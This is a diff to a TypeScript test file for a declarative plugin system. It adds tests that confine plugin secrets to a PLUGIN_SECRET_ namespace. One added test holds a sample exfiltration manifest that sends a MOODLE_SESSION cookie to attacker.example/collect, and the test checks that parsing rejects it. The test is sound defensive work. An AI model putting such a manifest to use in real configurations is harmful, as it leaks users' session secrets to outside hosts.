@@ -1,5 +1,5 @@
 import { describe, expect, it, vi } from "vitest";
-import { DeclarativePlugin, type PluginManifest } from "../src/plugins/declarative/plugin";
+import { DeclarativePlugin, parsePluginManifest, pluginBindings, type PluginManifest } from "../src/plugins/declarative/plugin";
 
 describe("DeclarativePlugin.pull", () => {
   it("maps JSON records and facets using a manifest", async () => {
@@ -10,7 +10,7 @@ describe("DeclarativePlugin.pull", () => {
       format: "json",
       url: "https://api.example.com/issues",
       itemsPath: "data.issues",
-      auth: { type: "bearer", binding: "EXAMPLE_TOKEN" },
+      auth: { type: "bearer", binding: "PLUGIN_SECRET_EXAMPLE" },
       mapping: {
         id: { path: "id" },
         kind: { value: "issue" },
@@ -43,7 +43,7 @@ describe("DeclarativePlugin.pull", () => {
         },
       }),
     );
-    const plugin = new DeclarativePlugin(manifest, { EXAMPLE_TOKEN: "secret" }, fetcher);
+    const plugin = new DeclarativePlugin(manifest, { PLUGIN_SECRET_EXAMPLE: "secret" }, fetcher);
 
     const items = await plugin.pull();
 
@@ -64,6 +64,25 @@ describe("DeclarativePlugin.pull", () => {
       }),
     ]);
     expect(fetcher.mock.calls[0]?.[1]?.headers).toMatchObject({ Authorization: "Bearer secret" });
+  });
+
+  it("rejects a manifest whose auth binding escapes the plugin secret namespace", () => {
+    const malicious = {
+      version: 1,
+      id: "exfil",
+      name: "x",
+      format: "json",
+      url: "https://attacker.example/collect",
+      auth: { type: "query", name: "k", binding: "MOODLE_SESSION" },
+      mapping: { id: { path: "id" }, kind: { value: "x" }, title: { path: "t" }, timestamp: { path: "ts" } },
+    };
+    expect(() => parsePluginManifest(malicious)).toThrow(/PLUGIN_SECRET_/);
+  });
+
+  it("only exposes PLUGIN_SECRET_* env entries to declarative plugins", () => {
+    expect(pluginBindings({ MOODLE_SESSION: "cookie", ADMIN_TOKEN: "root", PLUGIN_SECRET_FEED: "ok" })).toEqual({
+      PLUGIN_SECRET_FEED: "ok",
+    });
   });
 
   it("normalizes RSS entries before applying the manifest", async () => {
